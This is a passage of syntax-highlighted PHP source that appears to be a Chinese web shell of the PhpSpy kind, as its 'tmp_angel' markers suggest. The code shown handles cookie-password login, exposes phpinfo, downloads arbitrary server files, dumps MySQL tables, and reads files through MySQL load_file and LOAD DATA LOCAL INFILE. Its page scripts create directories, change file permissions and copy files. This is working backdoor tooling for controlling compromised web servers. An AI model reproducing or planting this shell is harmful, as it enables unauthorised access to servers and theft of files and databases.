</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">elseif</span> ($charset <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;big5&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-Type: text/html; charset=big5&#34;</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">elseif</span> ($charset <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;gbk&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-Type: text/html; charset=gbk&#34;</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">elseif</span> ($charset <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;latin1&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-Type: text/html; charset=iso-8859-2&#34;</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">elseif</span> ($charset <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;euc-kr&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-Type: text/html; charset=euc-kr&#34;</span>);
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">elseif</span> ($charset <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;euc-jp&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;content-Type: text/html; charset=euc-jp&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$self <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>] <span style="color:#f92672">?</span> $_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>] <span style="color:#f92672">:</span> $_SERVER[<span style="color:#e6db74">&#39;SCRIPT_NAME&#39;</span>];
</span></span><span style="display:flex;"><span>$timestamp <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*===================== 身份验证 =====================*/</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;logout&#34;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scookie</span>(<span style="color:#e6db74">&#39;loginpass&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, <span style="color:#f92672">-</span><span style="color:#ae81ff">86400</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">365</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">@</span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: &#39;</span> <span style="color:#f92672">.</span> $self);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($pass) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;login&#39;</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($pass <span style="color:#f92672">==</span> <span style="color:#a6e22e">encode_pass</span>($password)) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">scookie</span>(<span style="color:#e6db74">&#39;loginpass&#39;</span>, <span style="color:#a6e22e">encode_pass</span>($password));
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">@</span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: &#39;</span> <span style="color:#f92672">.</span> $self);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_COOKIE[<span style="color:#e6db74">&#39;loginpass&#39;</span>]) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($_COOKIE[<span style="color:#e6db74">&#39;loginpass&#39;</span>] <span style="color:#f92672">!=</span> $pass) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">loginpage</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">loginpage</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*===================== 验证结束 =====================*/</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>;
</span></span><span style="display:flex;"><span><span style="color:#f92672">!</span>$action <span style="color:#f92672">&amp;&amp;</span> $action <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;file&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 查看PHPINFO
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($action <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;phpinfo&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">IS_PHPINFO</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">phpinfo</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;phpinfo() function has non-permissible&#39;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 下载文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($doing <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;downfile&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $thefile) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!@</span><span style="color:#a6e22e">file_exists</span>($thefile)) {
</span></span><span style="display:flex;"><span>        $errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;The file you want Downloadable was nonexistent&#39;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $fileinfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($thefile);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type: application/x-&#39;</span> <span style="color:#f92672">.</span> $fileinfo[<span style="color:#e6db74">&#39;extension&#39;</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: attachment; filename=&#39;</span> <span style="color:#f92672">.</span> $fileinfo[<span style="color:#e6db74">&#39;basename&#39;</span>]);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Length: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">filesize</span>($thefile));
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">readfile</span>($thefile);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 直接下载备份数据库
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($doing <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;backupmysql&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>$saveasfile) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$table) {
</span></span><span style="display:flex;"><span>        $errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Please choose the table&#39;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $mysqllink <span style="color:#f92672">=</span> <span style="color:#a6e22e">mydbconn</span>($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span><span style="display:flex;"><span>        $filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">basename</span>($dbname <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.sql&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type: application/unknown&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: attachment; filename=&#39;</span> <span style="color:#f92672">.</span> $filename);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">foreach</span> ($table <span style="color:#66d9ef">as</span> $k <span style="color:#f92672">=&gt;</span> $v) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($v) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">sqldumptable</span>($v);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mysql_close</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 通过MYSQL下载文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> ($doing <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;mysqldown&#39;</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$dbname) {
</span></span><span style="display:flex;"><span>        $errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Please input dbname&#39;</span>;
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>        $mysqllink <span style="color:#f92672">=</span> <span style="color:#a6e22e">mydbconn</span>($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">file_exists</span>($mysqldlfile)) {
</span></span><span style="display:flex;"><span>            $errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;The file you want Downloadable was nonexistent&#39;</span>;
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">q</span>(<span style="color:#e6db74">&#34;select load_file(&#39;</span><span style="color:#e6db74">$mysqldlfile</span><span style="color:#e6db74">&#39;);&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$result) {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">q</span>(<span style="color:#e6db74">&#34;DROP TABLE IF EXISTS tmp_angel;&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">q</span>(<span style="color:#e6db74">&#34;CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#75715e">//用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">q</span>(<span style="color:#e6db74">&#34;LOAD DATA LOCAL INFILE &#39;&#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">addslashes</span>($mysqldlfile) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;&#39; INTO TABLE tmp_angel FIELDS TERMINATED BY &#39;__angel_</span><span style="color:#e6db74">{</span>$timestamp<span style="color:#e6db74">}</span><span style="color:#e6db74">_eof__&#39; ESCAPED BY &#39;&#39; LINES TERMINATED BY &#39;__angel_</span><span style="color:#e6db74">{</span>$timestamp<span style="color:#e6db74">}</span><span style="color:#e6db74">_eof__&#39;;&#34;</span>);
</span></span><span style="display:flex;"><span>                $result <span style="color:#f92672">=</span> <span style="color:#a6e22e">q</span>(<span style="color:#e6db74">&#34;select content from tmp_angel&#34;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">q</span>(<span style="color:#e6db74">&#34;DROP TABLE tmp_angel&#34;</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            $row <span style="color:#f92672">=</span> <span style="color:#f92672">@</span><span style="color:#a6e22e">mysql_fetch_array</span>($result);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$row) {
</span></span><span style="display:flex;"><span>                $errmsg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Load file failed &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">mysql_error</span>();
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $fileinfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">pathinfo</span>($mysqldlfile);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-type: application/x-&#39;</span> <span style="color:#f92672">.</span> $fileinfo[<span style="color:#e6db74">&#39;extension&#39;</span>]);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Disposition: attachment; filename=&#39;</span> <span style="color:#f92672">.</span> $fileinfo[<span style="color:#e6db74">&#39;basename&#39;</span>]);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Accept-Length: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">strlen</span>($row[<span style="color:#ae81ff">0</span>]));
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">echo</span> $row[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;html&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">&lt;head&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=gbk&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        &lt;?php echo $action . &#39; - &#39; . $_SERVER[&#39;HTTP_HOST&#39;]; ?&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/title&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;style type=&#34;text/css&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        body,
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        td {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font: 12px Arial, Tahoma;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            line-height: 16px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .input {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font: 12px Arial, Tahoma;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #fff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border: 1px solid #666;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 2px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            height: 22px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .area {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font: 12px &#39;Courier New&#39;, Monospace;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #fff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border: 1px solid #666;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 2px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .bt {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-color: #b0b0b0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #3d3d3d;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            color: #ffffff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font: 12px Arial, Tahoma;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            height: 22px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        a {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            color: #00f;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            text-decoration: underline;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        a:hover {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            color: #f00;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            text-decoration: none;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .alt1 td {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-top: 1px solid #fff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-bottom: 1px solid #ddd;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #f1f1f1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 5px 15px 5px 5px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .alt2 td {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-top: 1px solid #fff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-bottom: 1px solid #ddd;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #f9f9f9;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 5px 15px 5px 5px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .focus td {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-top: 1px solid #fff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-bottom: 1px solid #ddd;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #ffffaa;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 5px 15px 5px 5px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .head td {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-top: 1px solid #fff;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border-bottom: 1px solid #ddd;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #e9e9e9;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 5px 15px 5px 5px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font-weight: bold;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .head td span {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font-weight: normal;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .infolist {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 10px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            margin: 10px 0 20px 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            background: #F1F1F1;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            border: 1px solid #ddd;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        form {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            margin: 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        h2 {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            margin: 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            height: 24px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            line-height: 24px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            font-size: 14px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            color: #5B686F;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        ul.info li {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            margin: 0;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            color: #444;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            line-height: 24px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            height: 24px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        u {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            text-decoration: none;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            color: #777;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            float: left;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            display: block;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            width: 150px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            margin-right: 10px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .drives {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            padding: 5px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        .drives span {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            margin: auto 7px;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;/style&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">    &lt;script type=&#34;text/javascript&#34;&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function CheckAll(form) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            for (var i = 0; i &lt; form.elements.length; i++) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                var e = form.elements[i];
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                if (e.name != &#39;chkall&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">                    e.checked = form.chkall.checked;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function $(id) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            return document.getElementById(id);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function createdir() {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            var newdirname;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            newdirname = prompt(&#39;Please input the directory name:&#39;, &#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!newdirname) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;createdir&#39;).newdirname.value = newdirname;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;createdir&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function fileperm(pfile) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            var newperm;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            newperm = prompt(&#39;Current file:&#39; + pfile + &#39;\nPlease input new attribute:&#39;, &#39;&#39;);
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            if (!newperm) return;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileperm&#39;).newperm.value = newperm;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileperm&#39;).pfile.value = pfile;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            $(&#39;fileperm&#39;).submit();
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        }
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">        function copyfile(sname) {
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            var tofile;
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">            tofile = prompt(&#39;Original file:&#39; + sname + &#39;\nPlease input object file (fullpath):&#39;, &#39;&#39;);
